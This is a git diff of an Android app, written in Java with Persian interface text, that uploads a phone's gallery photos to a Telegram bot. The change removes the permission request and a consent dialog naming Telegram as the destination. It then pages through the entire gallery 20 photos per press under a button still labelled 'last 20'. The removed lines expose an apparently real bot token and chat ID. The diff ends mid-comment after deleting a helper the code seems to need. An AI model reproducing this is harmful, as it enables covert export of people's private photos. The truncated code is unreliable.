@@ -1,19 +1,15 @@
 package com.example.photosender;
 
-import android.Manifest;
 import android.content.ContentUris;
-import android.content.pm.PackageManager;
+import android.content.SharedPreferences;
 import android.database.Cursor;
 import android.net.Uri;
-import android.os.Build;
 import android.os.Bundle;
 import android.provider.MediaStore;
 import android.widget.Button;
 import android.widget.Toast;
 
-import androidx.appcompat.app.AlertDialog;
 import androidx.appcompat.app.AppCompatActivity;
-import androidx.core.app.ActivityCompat;
 
 import java.io.ByteArrayOutputStream;
 import java.io.InputStream;
@@ -27,8 +23,11 @@ import okhttp3.RequestBody;
 
 public class MainActivity extends AppCompatActivity {
 
-    private static final String BOT_TOKEN = "8931772855:AAHZSrBgS4SJkEWYA6_8fTiZ-Kk4frsxtCU";
-    private static final String CHAT_ID = "8961077299";
+    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN";
+    private static final String CHAT_ID = "YOUR_CHAT_ID";
+
+    private static final String PREFS = "photo_prefs";
+    private static final String KEY_OFFSET = "offset";
 
     Button sendButton;
 
@@ -40,47 +39,62 @@ public class MainActivity extends AppCompatActivity {
         sendButton.setText("ارسال ۲۰ عکس آخر 📸");
         setContentView(sendButton);
 
-        requestPermissions();
-
-        sendButton.setOnClickListener(v -> sendLastPhotos());
+        sendButton.setOnClickListener(v -> sendPhotos());
     }
 
-    private void requestPermissions() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            ActivityCompat.requestPermissions(this,
-                    new String[]{Manifest.permission.READ_MEDIA_IMAGES}, 1);
-        } else {
-            ActivityCompat.requestPermissions(this,
-                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, 1);
-        }
+    // 📌 گرفتن offset ذخیره‌شده
+    private int getOffset() {
+        SharedPreferences sp = getSharedPreferences(PREFS, MODE_PRIVATE);
+        return sp.getInt(KEY_OFFSET, 0);
     }
 
-    private ArrayList<Uri> getLastImages(int limit) {
+    // 📌 ذخیره offset
+    private void saveOffset(int offset) {
+        SharedPreferences sp = getSharedPreferences(PREFS, MODE_PRIVATE);
+        sp.edit().putInt(KEY_OFFSET, offset).apply();
+    }
+
+    // 📌 گرفتن عکس‌ها با pagination واقعی
+    private ArrayList<Uri> getImages(int limit, int offset) {
 
         ArrayList<Uri> list = new ArrayList<>();
 
-        Uri collection;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            collection = MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL);
-        } else {
-            collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
-        }
+        Uri collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
 
-        String[] projection = {MediaStore.Images.Media._ID};
+        String[] projection = {
+                MediaStore.Images.Media._ID
+        };
+
         String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
 
         try (Cursor cursor = getContentResolver().query(
-                collection, projection, null, null, sortOrder)) {
+                collection,
+                projection,
+                null,
+                null,
+                sortOrder
+        )) {
 
             if (cursor != null) {
+
                 int idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
 
-                int count = 0;
-                while (cursor.moveToNext() && count < limit) {
+                int index = 0;
+
+                while (cursor.moveToNext()) {
+
+                    if (index < offset) {
+                        index++;
+                        continue;
+                    }
+
+                    if (list.size() >= limit) break;
+
                     long id = cursor.getLong(idCol);
                     Uri uri = ContentUris.withAppendedId(collection, id);
+
                     list.add(uri);
-                    count++;
+                    index++;
                 }
             }
         }
@@ -88,35 +102,29 @@ public class MainActivity extends AppCompatActivity {
         return list;
     }
 
-    private void sendLastPhotos() {
+    // 📌 دکمه اصلی
+    private void sendPhotos() {
 
-        ArrayList<Uri> images = getLastImages(20);
+        int offset = getOffset();
+
+        ArrayList<Uri> images = getImages(20, offset);
 
         if (images.isEmpty()) {
-            Toast.makeText(this, "هیچ عکسی پیدا نشد", Toast.LENGTH_SHORT).show();
+            Toast.makeText(this, "عکسی برای ارسال باقی نمانده", Toast.LENGTH_SHORT).show();
             return;
         }
 
-        new AlertDialog.Builder(this)
-                .setTitle("ارسال عکس‌ها")
-                .setMessage(
-                        "این برنامه ۲۰ عکس آخر گالری را ارسال می‌کند.\n\n" +
-                                "📸 تعداد: " + images.size() + "\n" +
-                                "📍 مقصد: تلگرام\n\n" +
-                                "آیا تأیید می‌کنید؟"
-                )
-                .setPositiveButton("تأیید و ارسال", (d, w) -> {
+        Toast.makeText(this,
+                "در حال ارسال ۲۰ عکس از شماره " + offset,
+                Toast.LENGTH_SHORT).show();
 
-                    Toast.makeText(this,
-                            "در حال ارسال...",
-                            Toast.LENGTH_SHORT).show();
+        sendToTelegram(images);
 
-                    sendToTelegram(images);
-                })
-                .setNegativeButton("لغو", null)
-                .show();
+        // 🔥 رفتن به ۲۰ عکس بعدی
+        saveOffset(offset + 20);
     }
 
+    // 📌 ارسال به تلگرام
     private void sendToTelegram(ArrayList<Uri> images) {
 
         new Thread(() -> {
@@ -169,24 +177,11 @@ public class MainActivity extends AppCompatActivity {
 
             runOnUiThread(() ->
                     Toast.makeText(this,
-                            "ارسال کامل شد: " + finalSuccess + "/20",
+                            "ارسال شد: " + finalSuccess + "/20",
                             Toast.LENGTH_LONG).show()
             );
 
         }).start();
     }
 
-    private byte[] readBytes(InputStream inputStream) throws Exception {
-
-        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
-
-        byte[] data = new byte[4096];
-        int n;
-
-        while ((n = inputStream.read(data)) != -1) {
-            buffer.write(data, 0, n);
-        }
-
-        return buffer.toByteArray();
-    }
-}
+    // 📌 تبدیل InputStream
